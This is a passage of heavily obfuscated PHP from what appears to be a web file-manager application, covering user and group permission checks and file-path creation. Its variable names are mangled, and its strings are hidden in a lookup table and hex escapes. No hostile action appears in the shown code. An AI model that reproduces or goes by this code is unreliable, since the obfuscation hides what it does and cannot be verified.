!is_array($é¨®™ê[$êæ„ÊĞÀ[87]])) { continue; } $‘Ìé³§[] = $é¨®™ê[$êæ„ÊĞÀ[87]][$êæ„ÊĞÀ[402]]; } } $à‹•è€ = array(); $ŒÊƒÁÕõ = $Ã³¿å¯”; $’ğÌš¯ë = Model($êæ„ÊĞÀ[1341]); $¸Í‡ÁÏÜ = Model($êæ„ÊĞÀ[512]); $ÊÖ÷­»à = array(); $ğ‰€ú·¬ = array(); $Úèªñ¢˜ = array(); $Š§ÆÔô­ = array(); if ($‘Ìé³§) { $‰¸½ğ‘È = $’ğÌš¯ë->where(array($êæ„ÊĞÀ[402] => array($êæ„ÊĞÀ[418], $‘Ìé³§)))->select(); foreach ($‰¸½ğ‘È as $ÜƒÀÅÑÙ) { $’şÙ°¨¥ = $’ğÌš¯ë->parentLevelArray($ÜƒÀÅÑÙ[$êæ„ÊĞÀ[511]]); $à‹•è€ = array_merge($à‹•è€, $’şÙ°¨¥); $ŒÊƒÁÕõ[] = $ÜƒÀÅÑÙ[$êæ„ÊĞÀ[496]]; $ÊÖ÷­»à[$ÜƒÀÅÑÙ[$êæ„ÊĞÀ[402]]] = $’şÙ°¨¥; $ğ‰€ú·¬[$ÜƒÀÅÑÙ[$êæ„ÊĞÀ[402]]] = $ÜƒÀÅÑÙ[$êæ„ÊĞÀ[496]]; } } $ŒÊƒÁÕõ = array_values(array_unique($ŒÊƒÁÕõ)); $ÀÉãñê = $ŒÊƒÁÕõ; foreach ($ÀÉãñê as $€‹¤èºë) { $é¨®™ê = $¸Í‡ÁÏÜ->getInfo($€‹¤èºë); $’şÙ°¨¥ = $’ğÌš¯ë->parentLevelArray($é¨®™ê[$êæ„ÊĞÀ[511]]); $ŒÊƒÁÕõ = array_merge($ŒÊƒÁÕõ, $’şÙ°¨¥); } $ŒÊƒÁÕõ = array_values(array_unique($ŒÊƒÁÕõ)); foreach ($ŒÊƒÁÕõ as $€‹¤èºë) { $é¨®™ê = $¸Í‡ÁÏÜ->getInfo($€‹¤èºë); $à‹•è€[] = $é¨®™ê[$êæ„ÊĞÀ[87]][$êæ„ÊĞÀ[402]]; $Úèªñ¢˜[$€‹¤èºë] = $é¨®™ê[$êæ„ÊĞÀ[87]][$êæ„ÊĞÀ[402]]; $Š§ÆÔô­[$€‹¤èºë] = $’ğÌš¯ë->parentLevelArray($é¨®™ê[$êæ„ÊĞÀ[511]]); } foreach ($ÊÖ÷­»à as $™Õß˜ƒŠ => $ı‹¥×ìı) { $—ãô®ì = $ğ‰€ú·¬[$™Õß˜ƒŠ]; if (!$—ãô®ì || !$Úèªñ¢˜[$—ãô®ì]) { continue; } $ˆó³´Ú» = array(); foreach ($Š§ÆÔô­[$—ãô®ì] as $€‹¤èºë) { $ˆó³´Ú»[] = $Úèªñ¢˜[$€‹¤èºë]; } $ÊÖ÷­»à[$™Õß˜ƒŠ] = array_merge($ˆó³´Ú», $ı‹¥×ìı); } $à‹•è€ = array_values(array_unique($à‹•è€)); $„©üÜäó = array($êæ„ÊĞÀ[2053] => $à‹•è€, $êæ„ÊĞÀ[2054] => $ÊÖ÷­»à); $ÇÒ·Ù¦³[$í¢Á¼Ôğ] = $„©üÜäó; return $„©üÜäó; } private function makeSourceAuth($äÒñë‹, $·úò¸ƒƒ, $¾ŠÉŸŸ¬ = false) { $°™œµ÷Ç =& $_SERVER[Îûáû“ş]; $ÊèŸÙ¤à = $°™œµ÷Ç[88]; $«ÛÙò÷á = $äÒñë‹[$°™œµ÷Ç[496]]; $¤Ë£¾„¨ = $äÒñë‹[$°™œµ÷Ç[411]] == SourceModel::TYPE_GROUP; $¯†Ç¤¶ = $¤Ë£¾„¨ ? $this->groupRootAuth($«ÛÙò÷á, $¾ŠÉŸŸ¬) : !1; if ($¯†Ç¤¶ && Model($°™œµ÷Ç[498])->authCheckAction($¯†Ç¤¶[$°™œµ÷Ç[413]], $°™œµ÷Ç[1882])) { return $this->groupAuthInfo($¯†Ç¤¶, $«ÛÙò÷á); } $©Ù©Ãëš = Model($°™œµ÷Ç[1341])->parentLevelArray($äÒñë‹[$°™œµ÷Ç[511]]); $©Ù©Ãëš = array_merge(array($äÒñë‹[$°™œµ÷Ç[402]]), array_reverse($©Ù©Ãëš)); $´‹ë‹Ãƒ = !1; foreach ($©Ù©Ãëš as $ñ©áè´) { if (!isset($·úò¸ƒƒ[$ñ©áè´])) { continue; } $”è‚üõ¨ = $this->authMake($·úò¸ƒƒ[$ñ©áè´], $¾ŠÉŸŸ¬); if ($”è‚üõ¨[$°™œµ÷Ç[467]]) { $´‹ë‹Ãƒ = $”è‚üõ¨; break; } } if (!$¤Ë£¾„¨) { return $´‹ë‹Ãƒ; } if (!$´‹ë‹Ãƒ && $¯†Ç¤¶) { $´‹ë‹Ãƒ = $this->groupAuthInfo($¯†Ç¤¶, $«ÛÙò÷á); } if (!$´‹ë‹Ãƒ) { $øö’£ÁÜ = Model($°™œµ÷Ç[512])->getInfo($«ÛÙò÷á); $êŒƒˆ = explode($°™œµ÷Ç[50], trim($øö’£ÁÜ[$°™œµ÷Ç[511]], $°™œµ÷Ç[50])); $êŒƒˆ = array_reverse($êŒƒˆ); foreach ($êŒƒˆ as $ÅËŸ°³) { if ($ÅËŸ°³ == $°™œµ÷Ç[198] || $ÅËŸ°³ == $ÊèŸÙ¤à) { continue; } $ğÓÓ–„¿ = $this->groupRootAuth($ÅËŸ°³, $¾ŠÉŸŸ¬); if (!$ğÓÓ–„¿) { continue; } $´‹ë‹Ãƒ = $this->groupAuthInfo($ğÓÓ–„¿, $ÅËŸ°³); break; } } if (!$´‹ë‹Ãƒ || $´‹ë‹Ãƒ[$°™œµ÷Ç[414]] <= 0) { $£Ä¤ß³Æ = $this->authDeepCheck($äÒñë‹[$°™œµ÷Ç[402]], $¾ŠÉŸŸ¬); if ($£Ä¤ß³Æ) { $´‹ë‹Ãƒ = $£Ä¤ß³Æ; } } return $´‹ë‹Ãƒ; } private function userIsRoot($²§•“ = false) { $Õ°Ù’ë =& $_SERVER[Îûáû“ş]; if (!$²§•“ && _get($GLOBALS, $Õ°Ù’ë[494])) { return !0; } $å€ùÁ = Model($Õ°Ù’ë[525])->getInfo($²§•“); $àıšŞ®¬ = Model($Õ°Ù’ë[2062])->listData($å€ùÁ[$Õ°Ù’ë[1551]]); if ($àıšŞ®¬ && $àıšŞ®¬[$Õ°Ù’ë[502]][$Õ°Ù’ë[2063]] == 1) { return !0; } return !1; } private function sourceAuthInfo($˜ÌÖàë) { $¸Ã÷‰õ =& $_SERVER[Îûáû“ş]; $ƒ³ÔôĞ§ = Model($¸Ã÷‰õ[1341]); $Ú½¨°ØÁ = $ƒ³ÔôĞ§->sourceInfo($˜ÌÖàë); if (!$Ú½¨°ØÁ) { return !1; } $ƒ³ÔôĞ§->groupPathDisplay($Ú½¨°ØÁ); $ò¬Š¾ß© = array($Ú½¨°ØÁ); $ò¬Š¾ß© = $ƒ³ÔôĞ§->_listAppendPath($ò¬Š¾ß©); $Ú½¨°ØÁ = $ò¬Š¾ß©[0]; $÷ÌÆ¢¶´ = $Ú½¨°ØÁ[$¸Ã÷‰õ[509]]; if (isset($Ú½¨°ØÁ[$¸Ã÷‰õ[517]])) { $²¶¶Úğç = explode($¸Ã÷‰õ[8], trim($Ú½¨°ØÁ[$¸Ã÷‰õ[509]], $¸Ã÷‰õ[8])); array_shift($²¶¶Úğç); $÷ÌÆ¢¶´ = $Ú½¨°ØÁ[$¸Ã÷‰õ[515]] . $¸Ã÷‰õ[2064] . implode($¸Ã÷‰õ[8], $²¶¶Úğç); } return array($¸Ã÷‰õ[420] => $Ú½¨°ØÁ[$¸Ã÷‰õ[32]], $¸Ã÷‰õ[84] => KodIO::make($Ú½¨°ØÁ[$¸Ã÷‰õ[402]]), $¸Ã÷‰õ[2065] => $÷ÌÆ¢¶´); } private function groupAuthInfo($‹Ë¸Ğ’, $¼»…üø) { $×Ù±öŒ =& $_SERVER[Îûáû“ş]; $‚‚¹ÛÌ– = Model($×Ù±öŒ[512])->getInfo($¼»…üø); return array($×Ù±öŒ[2066] => intval($‹Ë¸Ğ’[$×Ù±öŒ[413]]), $×Ù±öŒ[2050] => $‹Ë¸Ğ’, $×Ù±öŒ[2067] => LNG($×Ù±öŒ[2068]), $×Ù±öŒ[2059] => array($×Ù±öŒ[420] => $‚‚¹ÛÌ–[$×Ù±öŒ[32]], $×Ù±öŒ[84] => KodIO::make($‚‚¹ÛÌ–[$×Ù±öŒ[87]][$×Ù±öŒ[402]]), $×Ù±öŒ[2065] => $‚‚¹ÛÌ–[$×Ù±öŒ[516]])); } protected function groupRootAuth($ù§à™×·, $ª‰¢‘­ò = false) { $À“™ˆšœ =& $_SERVER[Îûáû“ş]; $ª‰¢‘­ò = $ª‰¢‘­ò ? $ª‰¢‘­ò : USER_ID; $ÜÜ‹«²Ò = $ª‰¢‘­ò . $À“™ˆšœ[2069] . $ù§à™×·; static $õ£ßçì¥ = array(); if (isset($õ£ßçì¥[$ÜÜ‹«²Ò])) { return $õ£ßçì¥[$ÜÜ‹«²Ò]; } $ôìÊ¡é = Model($À“™ˆšœ[512])->getInfo($ù§à™×·); $ÚàÚ¾Œï = $this->userGroupList($ª‰¢‘­ò); $¤¬ı”‘ó = isset($ÚàÚ¾Œï[$ù§à™×·]) ? $ÚàÚ¾Œï[$ù§à™×·][$À“™ˆšœ[413]] : !1; if ($¤¬ı”‘ó && Model($À“™ˆšœ[498])->authCheckAction($¤¬ı”‘ó[$À“™ˆšœ[413]], $À“™ˆšœ[1882])) { $õ£ßçì¥[$ÜÜ‹«²Ò] = $¤¬ı”‘ó; return $¤¬ı”‘ó; } $‘²ê‰´ë = $this->sourceAuthSelect($ôìÊ¡é[$À“™ˆšœ[87]][$À“™ˆšœ[402]]); $¬’àüö = $‘²ê‰´ë ? $this->authMake($‘²ê‰´ë, $ª‰¢‘­ò) : !1; $é‹ı ± = $¬’àüö ? $¬’àüö[$À“™ˆšœ[467]] : !1; $õ£ßçì¥[$ÜÜ‹«²Ò] = $é‹ı ± ? $é‹ı ± : $¤¬ı”‘ó; return $õ£ßçì¥[$ÜÜ‹«²Ò]; } public function authOwnerApply($—³ÕøÀÇ) { $å´şé™ =& $_SERVER[Îûáû“ş]; if (empty($—³ÕøÀÇ[$å´şé™[413]]) || isset($—³ÕøÀÇ[$å´şé™[2070]]) && $—³ÕøÀÇ[$å´şé™[2070]]) { return $—³ÕøÀÇ; } if (AuthModel::authCheckRoot($—³ÕøÀÇ[$å´şé™[413]][$å´şé™[414]])) { return $—³ÕøÀÇ; } $½ç†úÑ½ = Model($å´şé™[1341])->parentLevelArray($—³ÕøÀÇ[$å´şé™[511]]); $½ç†úÑ½ = array_merge(array($—³ÕøÀÇ[$å´şé™[402]]), array_reverse($½ç†úÑ½)); $ŞÒ¯µÁ½ = $this->sourceAuthSelect($½ç†úÑ½); $ø‡¿Îİ = array(); $‘Ï€ôøÊ = array(); foreach ($ŞÒ¯µÁ½ as $ ×¯ö÷Ë => $ÚßŒ®ƒª) { $Úª†Ç¬Õ = $this->authFolderOwnerUser($ÚßŒ®ƒª); $ø‡¿Îİ[$ ×¯ö÷Ë] = $Úª†Ç¬Õ; $‘Ï€ôøÊ = array_merge($‘Ï€ôøÊ, $Úª†Ç¬Õ[$å´şé™[590]]); if ($Úª†Ç¬Õ[$å´şé™[2071]]) { break; } } if (count($‘Ï€ôøÊ) == 0) { $‘Ï€ôøÊ = $this->authFolderOwnerGroup($—³ÕøÀÇ[$å´şé™[496]]); } $‘Ï€ôøÊ = array_unique($‘Ï€ôøÊ); if (AuthModel::authCheckRoot($—³ÕøÀÇ[$å´şé™[413]][$å´şé™[414]])) { $‘Ï€ôøÊ[] = USER_ID; } $—³ÕøÀÇ[$å´şé™[413]][$å´şé™[2072]] = Model($å´şé™[504])->userListInfo($‘Ï€ôøÊ); return $—³ÕøÀÇ; } private function authFolderOwnerGroup($ŒÀ°€æı) { $èş–ş¾± =& $_SERVER[Îûáû“ş]; $äå‚í“¾ = Model($èş–ş¾±[1951])->where(array($èş–ş¾±[1861] => $ŒÀ°€æı))->select(); $ğ¦äÁßı = array(); if (!$äå‚í“¾) { return $ğ¦äÁßı; } foreach ($äå‚í“¾ as $£§²«àà) { $Ëøñòñ = $this->authInfo($£§²«àà); if (AuthModel::authCheckRoot($Ëøñòñ[$èş–ş¾±[413]])) { $ğ¦äÁßı[] = $£§²«àà[$èş–ş¾±[1670]]; } } return $ğ¦äÁßı; } private function authFolderOwnerUser($²¥ìÇÓÃ) { $èñÚôÃß =& $_SERVER[Îûáû“ş]; $ÚÂéœáù = array(); $İ†ò„• = !1; foreach ($²¥ìÇÓÃ as $×—Ïáùö) { $»ÆØöøš = $this->authInfo($×—Ïáùö); if ($×—Ïáùö[$èñÚôÃß[496]] == $èñÚôÃß[198]) { $İ†ò„• = !0; } if ($×—Ïáùö[$èñÚôÃß[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($»ÆØöøš[$èñÚôÃß[413]])) { $ÚÂéœáù[] = $×—Ïáùö[$èñÚôÃß[496]]; } } } return array($èñÚôÃß[590] => $ÚÂéœáù, $èñÚôÃß[2071] => $İ†ò„•); } public function authMake($Ş–•æÀİ, $„÷ö·²¨ = false) { $ÉÔÌ„€¤ =& $_SERVER[Îûáû“ş]; $ÅÂ¥¾æ÷ = $this->authArrayCheck($Ş–•æÀİ, $„÷ö·²¨); if ($ÅÂ¥¾æ÷[$ÉÔÌ„€¤[2073]]) { $ÅÂ¥¾æ÷[$ÉÔÌ„€¤[2073]] = $this->sourceAuthInfo($ÅÂ¥¾æ÷[$ÉÔÌ„€¤[2073]]); } return $ÅÂ¥¾æ÷; } public function authArrayCheck($Ä¡ñÓı, $ÀÇÍâÊ÷ = false) { $¹ÛÒ²ª =& $_SERVER[Îûáû“ş]; if (!$Ä¡ñÓı) { return array($¹ÛÒ²ª[414] => 0, $¹ÛÒ²ª[467] => !1); } $ÀÇÍâÊ÷ = $ÀÇÍâÊ÷ ? $ÀÇÍâÊ÷ : USER_ID; $õ°á’¾‰ = 0; $¦»­ï«ø = 0; $—â¶Ôéğ = 0; $‡ııì½ = 0; $’Å¶é’‹ = 0; $ûşÎğ£ƒ = 0; $ûÜÉ¤Äı = 1000; $Î÷¼€ï = 0; $¥¹Í² = 0; $‹öˆ´ûÓ = 0; $¥Ìä¿ş† = 0; $ÏêîİÓñ = array($¹ÛÒ²ª[402] => 0); foreach ($Ä¡ñÓı as $ÏêîİÓñ) { $½©˜€¸© = $this->authInfo($ÏêîİÓñ); if (!$½©˜€¸©) { continue; } $äºúÜÁš = $ÏêîİÓñ[$¹ÛÒ²ª[496]]; $°Ú®ú¸† = intval($½©˜€¸©[$¹ÛÒ²ª[413]]); if ($ÏêîİÓñ[$¹ÛÒ²ª[411]] == SourceModel::TYPE_USER && $äºúÜÁš == $ÀÇÍâÊ÷) { $õ°á’¾‰ = !0; $—â¶Ôéğ = $½©˜€¸©; $¦»­ï«ø = $°Ú®ú¸†; } else { if ($ÏêîİÓñ[$¹ÛÒ²ª[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($äºúÜÁš, $ÀÇÍâÊ÷)) { $‡ııì½ = !0; $Ø³¯Ú©„ = $this->groupStepToUserGroup($äºúÜÁš, $ÀÇÍâÊ÷); if ($Ø³¯Ú©„ < $ûÜÉ¤Äı) { $ûÜÉ¤Äı = $Ø³¯Ú©„; $’Å¶é’‹ = $°Ú®ú¸†; $ûşÎğ£ƒ = $½©˜€¸©; $Î÷¼€ï = $äºúÜÁš; } if ($Ø³¯Ú©„ == $ûÜÉ¤Äı && $°Ú®ú¸† >= $’Å¶é’‹) { $’Å¶é’‹ = $°Ú®ú¸†; $ûşÎğ£ƒ = $½©˜€¸©; $Î÷¼€ï = $äºúÜÁš; } } else { if ($äºúÜÁš == $¹ÛÒ²ª[198]) { $¥¹Í² = !0; $¥Ìä¿ş† = $½©˜€¸©; $‹öˆ´ûÓ = $°Ú®ú¸†; } } } } if ($õ°á’¾‰) { $Æ¸´²­§ = $¦»­ï«ø; $½©˜€¸© = $—â¶Ôéğ; $ó»›İÊ = LNG($¹ÛÒ²ª[2074]); } else { if ($‡ııì½) { $Æ¸´²­§ = $’Å¶é’‹; $½©˜€¸© = $ûşÎğ£ƒ; $¶èŠ†¥’ = Model($¹ÛÒ²ª[512])->getInfo($Î÷¼€ï); $ó»›İÊ = $¹ÛÒ²ª[162] . $¶èŠ†¥’[$¹ÛÒ²ª[516]] . $¹ÛÒ²ª[2075] . LNG($¹ÛÒ²ª[2076]); } else { if ($¥¹Í²) { $Æ¸´²­§ = $‹öˆ´ûÓ; $½©˜€¸© = $¥Ìä¿ş†; $ó»›İÊ = LNG($¹ÛÒ²ª[2047]); } else { $Æ¸´²­§ = 0; $½©˜€¸© = !1; $ó»›İÊ = $¹ÛÒ²ª[12]; } } } $š©ËÀ¤¢ = array($¹ÛÒ²ª[2066] => intval($Æ¸´²­§), $¹ÛÒ²ª[2050] => $½©˜€¸©, $¹ÛÒ²ª[2067] => $ó»›İÊ, $¹ÛÒ²ª[2059] => $ÏêîİÓñ[$¹ÛÒ²ª[402]]); return $š©ËÀ¤¢; } private function groupContainUser($ã…—Ìç, $ÚØğ¯èª = false) { return in_array($ã…—Ìç, $this->userGroupParents($ÚØğ¯èª)); } private function groupStepToUserGroup($ã¡¯Ş‹¥, $öµµÁùß = false) { $ûŞÖû¸Ğ =& $_SERVER[Îûáû“ş]; $—ìˆú§‹ = $this->userGroupList($öµµÁùß); $Ùü³³ê = 1000; $¥üÊ‚¢ = $GLOBALS[$ûŞÖû¸Ğ[6]][$ûŞÖû¸Ğ[89]][$ûŞÖû¸Ğ[1964]] == 1; $¥ï°´„ = $¥üÊ‚¢ ? 3 : 2; foreach ($—ìˆú§‹ as $™·¯Õ¢ª) { if ($™·¯Õ¢ª[$ûŞÖû¸Ğ[1861]] == $ã¡¯Ş‹¥) { return 0; } $Ñ”õ–Ù÷ = explode($ûŞÖû¸Ğ[50], trim($™·¯Õ¢ª[$ûŞÖû¸Ğ[511]], $ûŞÖû¸Ğ[50])); if ($Ñ”õ–Ù÷[0] == $ûŞÖû¸Ğ[198] && count($Ñ”õ–Ù÷) > $¥ï°´„) { $ë°¶„ÎÊ = array_reverse(array_slice($Ñ”õ–Ù÷, $¥ï°´„)); $¥•’Ë¯à = array_search($ã¡¯Ş‹¥, $ë°¶„ÎÊ); if ($¥•’Ë¯à !== !1 && $¥•’Ë¯à + 1 <= $Ùü³³ê) { $Ùü³³ê = $¥•’Ë¯à + 1; } } } return $Ùü³³ê; } private function userGroupList($åÉÁ½‹ä = false) { $²§©‚Ğˆ =& $_SERVER[Îûáû“ş]; static $½Ç÷¥ñ· = array(); if (isset($½Ç÷¥ñ·[$åÉÁ½‹ä])) { return $½Ç÷¥ñ·[$åÉÁ½‹ä]; } $óÇ½îº = Model($²§©‚Ğˆ[525])->getInfo($åÉÁ½‹ä); $½Ç÷¥ñ·[$åÉÁ½‹ä] = array_to_keyvalue($óÇ½îº[$²§©‚Ğˆ[2048]], $²§©‚Ğˆ[1861]); return $½Ç÷¥ñ·[$åÉÁ½‹ä]; } public function userGroupParents($æş¬ç¨Ë) { $ï²•Ûƒ€ =& $_SERVER[Îûáû“ş]; static $üÅ¥«€ = array(); $æş¬ç¨Ë = $æş¬ç¨Ë ? $æş¬ç¨Ë : USER_ID; if (isset($üÅ¥«€[$æş¬ç¨Ë])) { return $üÅ¥«€[$æş¬ç¨Ë]; } $¤Ë¦‰øñ = $this->userGroupList($æş¬ç¨Ë); $Á âƒÊÉ = array(); $À£ô¿©¡ = $GLOBALS[$ï²•Ûƒ€[6]][$ï²•Ûƒ€[89]][$ï²•Ûƒ€[1964]] == 1; $¨á¢ßì” = $À£ô¿©¡ ? 3 : 2; foreach ($¤Ë¦‰øñ as $‡¹›Îšó) { $¥ëè¾± = array($‡¹›Îšó[$ï²•Ûƒ€[1861]]); $şí°ı± = explode($ï²•Ûƒ€[50], trim($‡¹›Îšó[$ï²•Ûƒ€[511]], $ï²•Ûƒ€[50])); if ($şí°ı±[0] == $ï²•Ûƒ€[198] && count($şí°ı±) > $¨á¢ßì”) { $ÂÑç×»— = array_slice($şí°ı±, $¨á¢ßì”); $¥ëè¾± = array_merge($¥ëè¾±, array_reverse($ÂÑç×»—)); } $Á âƒÊÉ = array_merge($Á âƒÊÉ, $¥ëè¾±); } $üÅ¥«€[$æş¬ç¨Ë] = array_unique($Á âƒÊÉ); return $üÅ¥«€[$æş¬ç¨Ë]; } public function authTargetInfoMake($™À›¦ñ˜) { $®û¥Öä£ =& $_SERVER[Îûáû“ş]; $‚•ÂûåÒ = array(); $§¢·×æî = array(); foreach ($™À›¦ñ˜ as $ñİë„³Ğ) { if ($ñİë„³Ğ[$®û¥Öä£[411]] == SourceModel::TYPE_USER) { $‚•ÂûåÒ[] = intval($ñİë„³Ğ[$®û¥Öä£[496]]); } else { if ($ñİë„³Ğ[$®û¥Öä£[411]] == SourceModel::TYPE_GROUP) { $§¢·×æî[] = intval($ñİë„³Ğ[$®û¥Öä£[496]]); } } } if ($‚•ÂûåÒ) { $‚•ÂûåÒ = Model($®û¥Öä£[504])->userListInfo($‚•ÂûåÒ); } if ($§¢·×æî) { $—Æ•ıš’ = array($®û¥Öä£[1949] => array($®û¥Öä£[418], $§¢·×æî)); $§¢·×æî = Model($®û¥Öä£[512])->field($®û¥Öä£[2077])->where($—Æ•ıš’)->select(); $§¢·×æî = array_to_keyvalue($§¢·×æî, $®û¥Öä£[1861]); } return array($®û¥Öä£[2078] => $‚•ÂûåÒ, $®û¥Öä£[2079] => $§¢·×æî); } public function authInfo($ÛŠÉßá˜) { $âßÚ’®š =& $_SERVER[Îûáû“ş]; if ($ÛŠÉßá˜[$âßÚ’®š[1965]]) { $â¼åíà’ = Model($âßÚ’®š[498])->listData($ÛŠÉßá˜[$âßÚ’®š[1965]]); if (!$â¼åíà’) { return !1; $ş¦ãÚ¼ = Model($âßÚ’®š[498])->listData(); $›©¯‰Ç· = array_filter_by_field($ş¦ãÚ¼, $âßÚ’®š[413], $âßÚ’®š[198]); return $›©¯‰Ç·; } $ç“Ûİì• = array_field_key($â¼åíà’, array($âßÚ’®š[399], $âßÚ’®š[32], $âßÚ’®š[413], $âßÚ’®š[1884], $âßÚ’®š[1885])); $ç“Ûİì•[$âßÚ’®š[2080]] = $ÛŠÉßá˜; return $ç“Ûİì•; } else { return array($âßÚ’®š[419] => 0, $âßÚ’®š[1867] => $ÛŠÉßá˜[$âßÚ’®š[2025]], $âßÚ’®š[420] => $âßÚ’®š[12], $âßÚ’®š[1884] => $âßÚ’®š[2081]); } } } goto DÑ„¼‡½ƒ; eâ¢öœ¦À¨: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\154\x65\x5f\x63\x6f\156\x74\x65\x6e\164\163"; protected $dataAuto = array(array("\x63\162\145\x61\164\145\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\x73\145\162\164", "\x66\x75\x6e\x63\164\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\154\145"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\x6d\145" => "\151\157\x5f\146\x69\x6c\145\x5f\x6d\145\x74\x61", "\x6d\145\164\x61\x46\x69\145\154\x64" => "\x66\151\x6c\x65\x49\x44"); public function fileInfo($ƒšÓš·„) { $£ÈĞ€ìü =& $_SERVER[Îûáû“ş]; static $™ã¸áˆ› = array(); if (!isset($™ã¸áˆ›[$ƒšÓš·„])) { $ÙµÅÄ¢ = $£ÈĞ€ìü[1910]; $ê©ñí„Æ = Model($£ÈĞ€ìü[471])->field($ÙµÅÄ¢)->where(array($£ÈĞ€ìü[469] => $ƒšÓš·„))->find(); $™ã¸áˆ›[$ƒšÓš·„] = $ê©ñí„Æ; } return $™ã¸áˆ›[$ƒšÓš·„]; } public function addFileByContent($ÃˆÆŞÀ– = '', $§ßÌØÔ“ = '') { $˜¢œµã« =& $_SERVER[Îûáû“ş]; $Œ…Ñ±æ = TEMP_PATH . $˜¢œµã«[1911]; if (!is_dir($Œ…Ñ±æ)) { mk_dir($Œ…Ñ±æ); } $›ìóöØ¬ = $Œ…Ñ±æ . $˜¢œµã«[1912] . rand_string(16); file_put_contents($›ìóöØ¬, $ÃˆÆŞÀ–); $Ô–òššº = $this->addFile($›ìóöØ¬, $§ßÌØÔ“, !0); if (file_exists($›ìóöØ¬)) { @unlink($›ìóöØ¬); } return $Ô–òššº; } public function createFileName($ÃÃè—µ®, $˜ö×ñ§À = false, $ÇãŸì © = false) { $ÔÍï¶îâ =& $_SERVER[Îûáû“ş]; $Øà©¬÷ = IO::init($ÔÍï¶îâ[8]); $å¤Ò­‰‚ = $this->makeFilePath($ÃÃè—µ®, $Øà©¬÷, $˜ö×ñ§À, $ÇãŸì ©); $Ê¬”òÄ® = $Øà©¬÷->pathFather($å¤Ò­‰‚); static $ŞÙÑÛÁ· = false; $èÆôä¬Ù = $ÔÍï¶îâ[1913] . md5($Ê¬”òÄ®); if (!$ŞÙÑÛÁ· && !Cache::get($èÆôä¬Ù)) { $ŞÙÑÛÁ· = !0; $Ï‚ÓƒüÆ = IO::mkdir($Ê¬”òÄ®); if (!IO::exist($Ï‚ÓƒüÆ . $ÔÍï¶îâ[796])) { IO::mkfile($Ï‚ÓƒüÆ . $ÔÍï¶îâ[796]); } Cache::set($èÆôä¬Ù, 1, 3600 * 2); } return $å¤Ò­‰‚; } public function makeFilePath($ò¿Œïº‰, $Ğ•ËÌ«, $‘˜Š‡²Ö = false, $”ß¾Àäı = false) { $ƒ»›•ä =& $_SERVER[Îûáû“ş]; $£ô’ÀÅ = Model($ƒ»›•ä[769])->get($ƒ»›•ä[1914]); $Õ÷¬Ü¼ô = KodIO::defaultIO() . date($ƒ»›•ä[1915]); $àİ“¶ã‚ = $Õ÷¬Ü¼ô . rand_string(5) . short_id(100); $ò¿Œïº‰ = str_replace($ƒ»›•ä[8], $ƒ»›•ä[11], KodIO::clear($ò¿Œïº‰)); $£…ŞÅ Ó = $Ğ•ËÌ«->ext($ò¿Œïº‰); if (!$ò¿Œïº‰) { $£ô’ÀÅ = $ƒ»›•ä[1916]; } switch ($£ô’ÀÅ) { case $ƒ»›•ä[1917]: $àİ“¶ã‚ = $àİ“¶ã‚ . $ƒ»›•ä[10] . $Ğ•ËÌ«->ext($ò¿Œïº‰); if ($£…ŞÅ Ó == $ƒ»›•ä[1854]) { $àİ“¶ã‚ .= $ƒ»›•ä[1208]; } break; case $ƒ»›•ä[1918]: $ÑşñèË® = Model($ƒ»›•ä[769])->get($ƒ»›•ä[770]); $Ï•¿†î = substr(md5($ƒ»›•ä[771] . $ÑşñèË® . date($ƒ»›•ä[746])), 0, 8); $Ì°áÅúñ = KodIO::defaultDriver(); $Õ÷¬Ü¼ô = $ƒ»›•ä[1239] . $Ì°áÅúñ[$ƒ»›•ä[399]] . $ƒ»›•ä[409] . date($ƒ»›•ä[1919]) . $Ï•¿†î . $ƒ»›•ä[8]; if ($£…ŞÅ Ó == $ƒ»›•ä[1854]) { $ò¿Œïº‰ .= $ƒ»›•ä[1208]; } $¦„å‘íÉ = $ƒ»›•ä[1920] . $Õ÷¬Ü¼ô . $ò¿Œïº‰; CacheLock::lock($¦„å‘íÉ); $àİ“¶ã‚ = $Õ÷¬Ü¼ô . $ò¿Œïº‰; if (IO::exist($Õ÷¬Ü¼ô . $ò¿Œïº‰)) { $óáÊ˜ë = substr($ò¿Œïº‰, 0, strlen($ò¿Œïº‰) - strlen($£…ŞÅ Ó)); $ß¶é = $”ß¾Àäı ? substr($”ß¾Àäı, 0, 5) : ($‘˜Š‡²Ö ? substr($‘˜Š‡²Ö, 0, 5) : rand_string(5)); $àİ“¶ã‚ = $Õ÷¬Ü¼ô . $óáÊ˜ë . $ß¶é . $ƒ»›•ä[10] . $£…ŞÅ Ó; } if (IO::isTypeObject($àİ“¶ã‚) && !IO::isUploadServer($àİ“¶ã‚)) { if (IO::exist($àİ“¶ã‚)) { return $àİ“¶ã‚; } $£“ÄãÖ = IO::setContent($àİ“¶ã‚, $ƒ»›•ä[12]); if (!$£“ÄãÖ) { show_json($ƒ»›•ä[1921], !1); } } CacheLock::unlock($¦„å‘íÉ); break; case $ƒ»›•ä[1916]: break; default: break; } return $àİ“¶ã‚; } public function addFileByRemote($ö—†, $ú²š¨¤Õ, $Îš¨­øÂ = array()) { $ÔÚ¶ĞÓ† =& $_SERVER[Îûáû“ş]; if (!IO::exist($ö—†)) { return !1; } $„ò‚ÄÍˆ = $Îš¨­øÂ[$ÔÚ¶ĞÓ†[176]] ? $Îš¨­øÂ[$ÔÚ¶ĞÓ†[176]] : $ÔÚ¶ĞÓ†[12]; $ˆØ‡Õ•ã = IO::hashMd5($ö—†, $„ò‚ÄÍˆ); $şæ»®î = KodIO::defaultDriver(); $ä½¯Ì…ö = array($ÔÚ¶ĞÓ†[545] => IO::size($ö—†), $ÔÚ¶ĞÓ†[1922] => 1, $ÔÚ¶ĞÓ†[420] => $ú²š¨¤Õ, $ÔÚ¶ĞÓ†[807] => $şæ»®î[$ÔÚ¶ĞÓ†[399]], $ÔÚ¶ĞÓ†[421] => $ö—†, $ÔÚ¶ĞÓ†[1923] => $Îš¨­øÂ[$ÔÚ¶ĞÓ†[177]] ? $Îš¨­øÂ[$ÔÚ¶ĞÓ†[177]] : IO::hashSimple($ö—†), $ÔÚ¶ĞÓ†[1924] => $ˆØ‡Õ•ã ? $ˆØ‡Õ•ã : $„ò‚ÄÍˆ); if ($µ“é®ì¥ = 